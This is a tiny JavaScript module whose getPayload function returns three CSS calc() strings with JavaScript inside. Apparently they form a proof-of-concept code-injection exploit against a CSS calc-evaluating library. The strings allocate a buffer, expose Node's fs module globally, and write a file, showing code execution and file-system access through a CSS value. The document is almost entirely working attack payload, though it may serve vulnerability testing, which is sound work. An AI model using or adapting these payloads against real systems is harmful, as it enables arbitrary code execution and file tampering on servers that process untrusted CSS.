function getPayload() {
  return [
    "calc((Buffer(10000)))",
    "calc((global['fs'] = require('fs')))",
    "calc((fs['writeFileSync']('reduce-css-calc', '')))"
  ];
}

module.exports = { getPayload };